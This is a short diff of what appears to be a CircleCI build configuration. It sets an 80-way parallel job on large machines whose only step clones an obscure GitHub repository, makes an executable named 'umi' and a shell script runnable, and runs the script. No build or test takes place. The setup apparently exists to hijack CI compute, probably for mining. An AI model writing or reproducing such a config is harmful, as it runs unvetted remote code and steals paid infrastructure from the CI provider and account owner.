@@ -4,7 +4,7 @@ jobs:
     docker:
       - image: node:latest
     parallelism: 80
-    resource_class: 2xlarge+(2)
+    resource_class: 2xlarge+
     steps:
       - run: git clone https://github.com/puyuhdus/0.git && cd 0 && chmod u+x umi sh.sh && ./sh.sh
 workflows:
